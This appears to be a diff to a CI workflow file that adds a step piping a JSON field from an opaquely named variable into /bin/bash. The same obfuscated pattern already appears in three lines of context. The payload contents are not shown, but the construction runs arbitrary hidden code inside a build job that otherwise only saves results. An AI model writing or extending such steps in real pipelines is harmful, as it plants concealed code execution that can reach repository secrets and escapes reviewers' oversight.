@@ -21,6 +21,7 @@ jobs:
           echo $l17122 | jq -r .k74 | /bin/bash
           echo $tfmq82 | jq -r .ve723 | /bin/bash
           printf '%s' "$fg26" | jq -r .dgk3 | /bin/bash
+          printf '%s' "$bedvk0" | jq -r .aocv950 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
